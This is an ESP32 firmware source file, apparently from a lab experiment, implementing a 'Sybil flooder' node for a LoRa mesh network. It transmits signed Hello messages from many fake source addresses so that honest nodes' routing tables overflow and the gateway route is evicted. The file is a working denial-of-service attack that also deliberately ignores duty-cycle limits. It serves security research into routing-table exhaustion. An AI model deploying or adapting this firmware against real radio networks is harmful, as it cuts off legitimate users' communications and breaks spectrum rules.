// E9 — Node C: SYBIL FLOODER
//
// Cycles through fake source addresses (0xD0–0xFF), broadcasting a signed
// Hello from each. Each unique src fills one routing table slot on honest nodes.
// After MAX_ROUTES_ESTIMATE (8) unique fakes, the routing table overflows
// and the legitimate gateway route (NH=0xBB) is evicted → DoS.
//
// Two flood modes (compile-time):
//   SIGN_HELLOS=1  — insider: attacker holds PSK, HMAC passes (mode=1 nodes affected)
//   SIGN_HELLOS=0  — outsider: no PSK, HMAC=zero (only mode=0 nodes affected)
//
// AS923 duty cycle: SF9 BW125 packet ≈ 185ms airtime.
// 1% DC on 923 MHz → max 1 packet / 18.5s per sub-band.
// This firmware does NOT enforce duty cycle (for controlled lab experiment).
// In production the SX1262 DutyCycle register would limit this naturally.
//
// Expected serial output:
//   [SYBIL] Hello src=0xD0 seq=0 (slot 1/8)
//   [SYBIL] Hello src=0xD1 seq=1 (slot 2/8)
//   ...
//   [SYBIL] Table FULL (8/8) — gateway route should now be evicted
//   [SYBIL] Cycling addresses... (keeping table saturated)
//
// Board: Ebyte EoRa PI (ESP32-S3FH4R2)  FQBN: esp32:esp32:esp32s3:CDCOnBoot=cdc

#define SIGN_HELLOS     1   // 1=insider mode (valid HMAC), 0=outsider (zero HMAC)
#define NODE_ID         0xCC
#define GATEWAY_ID      0xBB
#define FLOOD_INTERVAL_MS  2000   // 2s between floods — faster than legit Hello cycle

#include "../e9_common.h"
#include <Wire.h>
#include "SSD1306Wire.h"

SSD1306Wire oled(0x3c, 18, 17);

SPIClass spi(FSPI);
Module*  mod   = nullptr;
SX1262*  radio = nullptr;

volatile bool rxFlag = false;
void IRAM_ATTR onDio1() { rxFlag = true; }

uint16_t flood_seq      = 0;
uint32_t total_floods   = 0;
uint8_t  sybil_offset   = 0;   // cycles 0..SYBIL_ADDR_COUNT-1
uint32_t last_flood     = 0;
uint32_t last_oled      = 0;

void oled_draw() {
  oled.clear();
  oled.setFont(ArialMT_Plain_10);
  oled.setTextAlignment(TEXT_ALIGN_LEFT);
  oled.drawString(0,  0, "NODE C  SYBIL");
  char buf[32];
  snprintf(buf, sizeof(buf), "floods=%lu", total_floods);
  oled.drawString(0, 14, buf);
  uint8_t cur_addr = SYBIL_ADDR_START + sybil_offset;
  snprintf(buf, sizeof(buf), "cur_src=0x%02X", cur_addr);
  oled.drawString(0, 28, buf);
#if SIGN_HELLOS
  oled.drawString(0, 42, "SIGNED insider");
#else
  oled.drawString(0, 42, "UNSIGNED outsider");
#endif
  oled.display();
}

void send_sybil_hello() {
  uint8_t fake_src = SYBIL_ADDR_START + (sybil_offset % SYBIL_ADDR_COUNT);

  HelloMsg h = {};
  h.type   = MSG_HELLO;
  h.src    = fake_src;     // fake identity
  h.dst_gw = GATEWAY_ID;
  h.metric = 1;            // claim metric=1 to look like useful relay
  h.seq    = flood_seq++;

#if SIGN_HELLOS
  sign_hello(&h);          // valid HMAC for insider mode
#else
  memset(h.hmac, 0, HMAC_TAG_LEN);  // zero HMAC for outsider baseline
#endif

  radio->transmit((uint8_t*)&h, sizeof(h));
  radio->startReceive();
  total_floods++;

  uint8_t slot = (sybil_offset % MAX_ROUTES_ESTIMATE) + 1;
  Serial.printf("[SYBIL] Hello src=0x%02X seq=%u (slot ~%u/%u floods=%lu)\n",
                fake_src, h.seq, slot, MAX_ROUTES_ESTIMATE, total_floods);

  if (slot == MAX_ROUTES_ESTIMATE) {
    Serial.println("[SYBIL] Route table likely FULL — gateway route should be evicted");
    Serial.println("[SYBIL] Honest nodes now have no valid path to 0xBB");
  }

  sybil_offset = (sybil_offset + 1) % SYBIL_ADDR_COUNT;
}

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== E9 Node C (SYBIL FLOODER) ===");
  Serial.printf("[INFO] Flood mode: %s\n", SIGN_HELLOS ? "INSIDER (valid HMAC)" : "OUTSIDER (zero HMAC)");
  Serial.printf("[INFO] Sybil address range: 0x%02X–0x%02X (%d addresses)\n",
                SYBIL_ADDR_START, SYBIL_ADDR_END, SYBIL_ADDR_COUNT);
  Serial.printf("[INFO] MAX_ROUTES_ESTIMATE=%d — need %d floods to saturate table\n",
                MAX_ROUTES_ESTIMATE, MAX_ROUTES_ESTIMATE);
  Serial.println("[INFO] Finding: routing table exhaustion DoS not addressed by HMAC patch.");

  Wire.begin(18, 17);
  oled.init(); oled.flipScreenVertically();
  oled_draw();

  eora_radio_init();
  spi.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_NSS);
  mod   = new Module(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY, spi);
  radio = new SX1262(mod);
  int st = radio->begin(LORA_FREQ, LORA_BW, LORA_SF, LORA_CR,
                        LORA_SYNC, LORA_POWER, 8, LORA_TCXO);
  if (st != RADIOLIB_ERR_NONE) {
    Serial.printf("[ERR] Radio init: %d\n", st);
    while (true) delay(1000);
  }
  radio->setDio1Action(onDio1);
  radio->startReceive();
  Serial.println("[RADIO] SX1262 ready @ 923 MHz AS923");

  // Flood immediately
  for (int i = 0; i < MAX_ROUTES_ESTIMATE; i++) {
    send_sybil_hello();
    delay(200);
  }
  last_flood = millis();
}

void loop() {
  uint32_t now = millis();
  if (now - last_flood  >= FLOOD_INTERVAL_MS) { last_flood  = now; send_sybil_hello(); }
  if (now - last_oled   >= 5000)              { last_oled   = now; oled_draw(); }

  if (rxFlag) {
    rxFlag = false;
    uint8_t buf[256];
    size_t  pkt_len = radio->getPacketLength();
    radio->readData(buf, sizeof(buf));
    radio->startReceive();
    (void)pkt_len;
    // Sybil attacker does not process received packets
  }
}
